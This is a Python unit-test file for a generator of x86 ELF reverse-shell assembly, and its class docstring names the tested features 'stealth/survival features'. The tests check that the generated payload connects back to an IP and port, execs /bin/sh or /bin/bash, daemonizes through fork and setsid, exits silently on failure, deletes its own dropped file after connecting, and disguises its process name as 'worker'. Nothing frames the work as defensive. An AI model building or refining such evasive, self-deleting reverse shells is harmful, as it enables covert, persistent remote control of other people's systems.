import sys
import unittest
from pathlib import Path


sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from generate_elf import (  # noqa: E402
    build_assembly,
    ip_to_hex,
    name_to_hex,
    port_to_hex,
)


class FeatureTests(unittest.TestCase):
    """Stealth/survival features added on top of the base payload."""

    def test_daemonize_block_present_by_default(self):
        asm = build_assembly("127.0.0.1", 4444, "worker")
        self.assertIn("SYS_FORK", asm)
        self.assertIn("SYS_SETSID", asm)
        self.assertIn(".parent_exit", asm)
        self.assertIn(".daemonized", asm)

    def test_no_daemonize_omits_fork(self):
        asm = build_assembly("127.0.0.1", 4444, "worker", daemonize=False)
        self.assertNotIn("SYS_FORK", asm)
        self.assertNotIn("SYS_SETSID", asm)
        self.assertNotIn(".parent_exit", asm)

    def test_failure_paths_exit_quietly(self):
        asm = build_assembly("127.0.0.1", 4444, "worker")
        self.assertIn("js .fail", asm)
        self.assertIn("SYS_EXIT", asm)

    def test_drop_path_embeds_unlink_after_connect(self):
        asm = build_assembly("127.0.0.1", 4444, "worker", drop_path="/tmp/worker")
        self.assertIn("SYS_UNLINK", asm)
        self.assertIn("push dword 0x706d742f", asm)  # "/tmp" chunk
        self.assertIn("push dword 0x726f772f", asm)  # "/wor" chunk
        self.assertIn("push dword 0x0072656b", asm)  # "ker\0" chunk
        # still a plain execve of the shell, not a re-exec of the binary
        self.assertIn("mov al, 0xb", asm)
        self.assertIn("execve('/bin//sh'", asm)

    def test_shell_option_changes_exec_target(self):
        asm = build_assembly("127.0.0.1", 4444, "worker", shell="/bin/bash")
        self.assertIn("execve('/bin/bash'", asm)
        self.assertIn("push dword 0x7361622f", asm)  # "/bas" chunk

    def test_long_name_is_fully_encoded(self):
        # long names keep argv[0] intact regardless of length
        asm = build_assembly("127.0.0.1", 4444, "x" * 20)
        self.assertIn("push dword 0x78787878", asm)


class EncodingTests(unittest.TestCase):
    def test_ip_and_port_encoding(self):
        self.assertEqual(ip_to_hex("127.0.0.1"), "0100007f")
        self.assertEqual(port_to_hex(4444), "5c11")
        self.assertEqual(port_to_hex(80), "5000")
        self.assertEqual(port_to_hex(1), "0100")

    def test_long_name_is_pushed_in_correct_order(self):
        values = name_to_hex("abcdefgh")
        assembly = build_assembly("127.0.0.1", 4444, "abcdefgh")

        self.assertEqual(values, ["64636261", "68676665"])
        self.assertLess(assembly.index("push dword 0x68676665"), assembly.index("push dword 0x64636261"))

    def test_utf8_name_is_encoded_as_bytes(self):
        self.assertEqual(name_to_hex("é"), ["0000a9c3"])

    def test_invalid_inputs_are_rejected(self):
        with self.assertRaises(ValueError):
            ip_to_hex("not-an-ip")
        with self.assertRaises(ValueError):
            port_to_hex(0)
        with self.assertRaises(ValueError):
            port_to_hex(65536)
        with self.assertRaises(ValueError):
            name_to_hex("")
        with self.assertRaises(ValueError):
            name_to_hex("bad\x00name")


if __name__ == "__main__":
    unittest.main()
